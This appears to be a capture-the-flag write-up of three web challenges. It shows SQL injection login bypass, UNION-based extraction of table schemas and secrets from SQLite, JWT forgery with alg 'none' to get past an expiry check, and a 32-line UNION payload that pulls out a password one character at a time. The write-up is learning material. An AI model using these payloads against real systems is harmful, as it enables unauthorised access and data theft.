# 1. DATA BASE INCURSION 2.0
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## FLAG 
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}

## SOLUTION 
- i first executed an initial SQLi test using and obtained a json back which confirms that the backend is vulernable to sql injection 
```
 curl -s -X POST "https://database-incursion-v2.nitephase.live/" \
  -H "Accept: application/json" \
  -d "username=' OR 1=1-- &password=x"
```
- so i inputed ```'OR 1=1 --``` into the username field and put in a random password to login

<img width="1919" height="1063" alt="image" src="https://github.com/user-attachments/assets/024bdb28-1858-40bd-ac31-9a70f7892cf9" />


<img width="1919" height="1043" alt="image" src="https://github.com/user-attachments/assets/4352dddd-42e1-487f-ae2a-2b69907ca447" />


- to find the person from management i input ```' OR department='Management'--``` into the search bar which showed

<img width="1919" height="1062" alt="image" src="https://github.com/user-attachments/assets/ed5335cd-5a43-492d-9bf6-ce031393da40" />

- now that we know the person with passcode is Kiwi i used ```' OR name='Kiwi'--``` but i realised there are too many different kiwis
  
<img width="1917" height="1063" alt="image" src="https://github.com/user-attachments/assets/97a68bed-20c3-4f32-b3e1-6de898d9a547" />

- so i searched for kiwi specifically in management using ```' OR (name LIKE '%kiwi%' AND department LIKE '%manag%')--``` to obtain the passcode

<img width="1918" height="1010" alt="image" src="https://github.com/user-attachments/assets/2120fb8d-6679-4cf4-b126-7995abc9228a" />

- now i reached the admin panel with reports and metadata registry in which one entire row is REDACTED
- i inputed ```' UNION SELECT name, type, sql, 0 FROM sqlite_master-- ``` into the search bar and obtained 

<img width="1895" height="949" alt="image" src="https://github.com/user-attachments/assets/cc084e6c-bd39-482a-939e-e8fe96510d1e" />

- the flag is probably in CITADEL_ARCHIVE_2077 so i inputed ```' UNION SELECT secrets, null, null, null FROM CITADEL_ARCHIVE_2077 --``` into the search bar to get the flag 
<img width="1912" height="1065" alt="image" src="https://github.com/user-attachments/assets/951842a3-4855-45fd-b67a-0549844d54a3" />

## CONCEPTS LEARNED 
- how ```username=' OR 1=1-- &password=x``` helps us identify the sql injection vulernability
- ```' OR 1=1 --``` forces the query to always be true regardless of password
- we can use injection payloads to filter rows ```' OR name='Kiwi'--```
- ```' OR (name LIKE '%kiwi%' AND department LIKE '%manag%')--``` LIKE helps in pattern matching, AND helps combining multiple condition, % wildcard gives us different variations
- how we can use sql UNION-based injection to force the database to return your own data along with the normal query results
- ```'``` closes the original query ```SELECT name, type, sql, 0 FROM sqlite_master``` gives table name, table type, the SQL used to create it, a dummy 0 value to match the 4th column
- how we can use null for most placeholder columns is much much safer than using 0 which is only for columns with numerical values

## RESOURCES  
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

# 2. TEMPORAL TOKEN 
I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## FLAG 
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}

## SOLUTION 
- when we try logging in with the given login credentials it shows token expired
- first to analyse what they mean by token expired i did ctrl+shift+i to inspect
- under applications i saw that a token was given so i put it into jwt.io and saw that the expiry of the token was on 1st january 1970 and how the alg was HS256 but still the signature of the token was invalid
- i used https://kjur.github.io/jsrsasign/tool/tool_jwt.html to generate the new token where i put subject as Belegar, expiration as 1767225599 (unix time stamp for 32st dec 2025 but any future day will do), type as JWT.
- i left the signature empty because it wasnt shown while decoding the initial token and then encoded a new token

<img width="1895" height="1061" alt="Screenshot 2025-12-03 230224" src="https://github.com/user-attachments/assets/6c10c5bf-b5de-4703-bc48-86ce33916422" />

<img width="792" height="182" alt="Screenshot 2025-12-03 230237" src="https://github.com/user-attachments/assets/07e54ad8-7e9e-4710-9f9b-d0a1a72fbdce" />

- then i put this generated token into the site and i reloaded the site to obtain flag

 <img width="1916" height="1063" alt="Screenshot 2025-12-03 222535" src="https://github.com/user-attachments/assets/f1495120-ef6c-438b-9d5d-2c1f4836200c" />

 ## CONCEPTS LEARNED 
 - jwt has 3 parts, header.payload.signature
 - how we can use alg = "none" vulnerability where no signature and key is necessary for token

## RESOURCES 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- https://www.epochconverter.com/
- https://www.jwt.io/
- https://kjur.github.io/jsrsasign/tool/tool_jwt.html


# 3. ONESHOT 
Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## FLAG 
nite{are_you_feeling_the_heat_now :)}

## SOLUTION 
- when u enter the site we see
  
<img width="1919" height="1062" alt="image" src="https://github.com/user-attachments/assets/36564f3d-8a8c-46c4-b672-c6ac88fa7b8d" />

- and then when we click new session we get a screen

<img width="1916" height="1067" alt="image" src="https://github.com/user-attachments/assets/db585bd8-aa74-4541-82cb-6b13a15fa315" />

- when i simply click the search we get a screen

 <img width="1917" height="1068" alt="image" src="https://github.com/user-attachments/assets/80e75de4-9e97-4be1-b280-a5496176a889" />

- also observing the given code we understand that ```id = os.urandom(8).hex()``` table names are random hex
- ```db.execute(f"INSERT INTO table_{id} VALUES ('{os.urandom(16).hex()}', 0)")``` explins how exactly one password row is created per table
- ```query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")``` causes the password to be masked except the first character
- ```searched``` gets set to 1 after the first search therefore allowing only one search per session
- so we must extract all 32 characters of the password in a single payload
- first using ctrl+u i viewed the source page of the site and obtained the session id
- so i started the payload with ```%'``` to first terminate the original LIKE string
- then using union i created a payload to extract all 32 characters 
- when i inputed it to the search bar i got

<img width="1919" height="1051" alt="Screenshot 2025-12-05 021635" src="https://github.com/user-attachments/assets/cf511dcb-9b33-4254-a8ca-f3df3ea4f0ce" />

- when i typed the correct password into the search bar i got the flag

<img width="1919" height="1067" alt="Screenshot 2025-12-05 021821" src="https://github.com/user-attachments/assets/5affea3f-c66a-44a5-ae72-04fca2a960e3" />

## FINAL PAYLOAD 
```
%' UNION ALL SELECT substr(password,1,1) FROM table_fa42a374b2bd66d0 
UNION ALL SELECT substr(password,2,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,3,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,4,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,5,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,6,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,7,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,8,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,9,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,10,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,11,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,12,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,13,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,14,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,15,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,16,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,17,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,18,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,19,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,20,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,21,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,22,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,23,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,24,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,25,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,26,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,27,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,28,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,29,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,30,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,31,1) FROM table_fa42a374b2bd66d0
UNION ALL SELECT substr(password,32,1) FROM table_fa42a374b2bd66d0 --
```



## CONCEPTS LEARNED 
- ```UNION SELECT``` helps us
- ```substr(password, n, 1)``` returns the nth character
- each ```UNION ALL SELECT substr(password, k, 1) FROM table_<id>``` returns a single row containing the k-th character as the column value

## RESOURCES 
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://www.sqlite.org/lang_corefunc.html#substr
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://owasp.org/www-community/attacks/Blind_SQL_Injection








  





